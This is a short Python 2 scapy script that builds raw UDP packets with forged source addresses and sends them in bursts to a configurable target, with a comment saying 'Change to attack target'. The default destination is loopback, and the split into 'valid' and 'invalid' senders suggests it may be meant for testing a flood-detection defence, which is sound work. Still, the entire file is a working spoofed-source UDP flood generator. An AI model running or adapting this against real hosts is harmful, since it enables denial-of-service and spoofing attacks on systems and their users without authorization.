import random
import struct
import time
from scapy.all import IP, UDP, Ether, conf

range = xrange
intf = 'lo'
DSTIP = str("127.0.0.1")  # Change to attack target
DPORT = 1234  # attack target
RATIO = 0.1
base = (Ether() / IP(dst=DSTIP) / UDP(dport=DPORT)).build()

sender = conf.L2socket(iface=intf)
senders = [struct.pack(">I", 0x6fde2100 + i) for i in range(256)]
random.shuffle(senders)

VALID_SENDER = senders[:int(len(senders) * RATIO)]
INVALID_SENDER = senders[int(len(senders) * RATIO):]

HEAD = base[:26]
TAIL = base[30:]


def genPkt(ip):
    return HEAD + ip + TAIL


def genAtkPktInterval():
    global INVALID_SENDER
    Count = {i: random.randint(0, 10) for i in VALID_SENDER}
    Count.update({i: random.randint(40, 60) for i in INVALID_SENDER})
    keys = Count.keys()
    while len(keys) > 0:
        key = random.choice(keys)
        if Count[key] == 0:
            keys.remove(key)
            continue
        pkt = genPkt(key)
        sender.send(pkt)
        Count[key] -= 1
    INVALID_SENDER = INVALID_SENDER[20:]


def genAtkPkt():
    for _ in range(10):
        time.sleep(random.randint(50, 100) * 0.00001)
        genAtkPktInterval()


if __name__ == '__main__':
    genAtkPkt()
